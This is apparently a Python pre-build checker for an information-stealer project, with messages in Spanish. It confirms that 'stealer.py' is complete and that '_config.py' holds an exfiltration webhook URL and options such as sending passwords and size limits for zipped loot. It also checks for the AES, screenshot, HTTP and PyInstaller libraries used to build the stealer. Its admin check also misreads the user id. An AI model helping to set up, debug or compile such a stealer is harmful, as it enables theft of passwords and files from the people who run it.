import importlib
import os
import re
import sys
from pathlib import Path

AQUI = Path(__file__).resolve().parent
fallos, avisos = [], []

def ok(m):  print(f"  [OK]    {m}")
def mal(m): print(f"  [FALLO] {m}"); fallos.append(m)
def ojo(m): print(f"  [AVISO] {m}"); avisos.append(m)

print("=== DIAGNOSTICO ===")
print(f"python : {sys.version.split()[0]}")
print(f"exe    : {sys.executable}")
print(f"carpeta: {AQUI}\n")

if sys.version_info > (3, 13):
    ojo(f"Python {sys.version.split()[0]} es muy nuevo: PyInstaller y "
        f"pycryptodome pueden fallar. Usa 3.12 o 3.13.")
else:
    ok("version de Python soportada")

try:
    print(f"admin  : {'si' if os.getuid() else 'no'}")
except Exception:
    import ctypes
    print(f"admin  : {'si' if ctypes.windll.shell32.IsUserAnAdmin() else 'no'}")

for nombre in ("stealer.py", "_config.py"):
    p = AQUI / nombre
    if not p.exists():
        mal(f"falta {nombre}")
        continue
    ok(f"{nombre} existe ({p.stat().st_size} bytes)")

s = AQUI / "stealer.py"
if s.exists():
    texto = s.read_text(encoding="utf-8", errors="ignore")
    sueltas = [n for n, l in enumerate(texto.splitlines(), 1)
               if l.strip().startswith("```")]
    if sueltas:
        mal(f"fences pegadas en las lineas {sueltas[:5]}")
    else:
        ok("sin fences sueltas")
    lineas = texto.count("\n")
    if lineas < 900:
        mal(f"stealer.py parece incompleto ({lineas} lineas, se esperan ~1000)")
    else:
        ok(f"stealer.py completo ({lineas} lineas)")
    if "main()" not in texto.splitlines()[-3:]:
        ojo("el final del archivo no parece el esperado")
    try:
        import py_compile
        py_compile.compile(str(s), doraise=True)
        ok("stealer.py compila sin errores de sintaxis")
    except Exception as e:
        mal(f"sintaxis: {e}")

c = AQUI / "_config.py"
if c.exists():
    cfg = c.read_text(encoding="utf-8", errors="ignore")
    m = re.search(r'WEBHOOK\s*=\s*["\']([^"\']+)', cfg)
    if not m:
        mal("_config.py sin WEBHOOK")
    elif "api/webhooks" not in m.group(1):
        mal(f"WEBHOOK invalido: {m.group(1)[:60]}")
    else:
        ok("WEBHOOK con formato correcto")
    for campo in ("ENVIAR_PASSWORDS", "ZIP_MAX_MB", "CSV_MAX_MB"):
        if campo not in cfg:
            mal(f"_config.py sin {campo} (config desincronizada)")
    if all(x in cfg for x in ("ENVIAR_PASSWORDS", "ZIP_MAX_MB")):
        ok("_config.py sincronizado")

for mod, etiqueta in (("Crypto.Cipher.AES", "pycryptodome"),
                      ("PIL.ImageGrab", "pillow"),
                      ("requests", "requests")):
    try:
        importlib.import_module(mod)
        ok(f"{etiqueta} importa")
    except Exception as e:
        mal(f"{etiqueta}: {e}")

try:
    import PyInstaller
    ok(f"pyinstaller {PyInstaller.__version__}")
except Exception:
    ojo("pyinstaller no instalado (solo hace falta para compilar)")

import tempfile
try:
    t = Path(tempfile.gettempdir()) / "diag_test.tmp"
    t.write_text("x")
    t.unlink()
    ok("TEMP escribible")
except Exception as e:
    mal(f"TEMP no escribible: {e}")

print()
if fallos:
    print(f"RESULTADO: {len(fallos)} fallo(s) · {len(avisos)} aviso(s)")
    for f in fallos:
        print(f"  - {f}")
    sys.exit(1)
print(f"RESULTADO: sin fallos · {len(avisos)} aviso(s)")
sys.exit(0)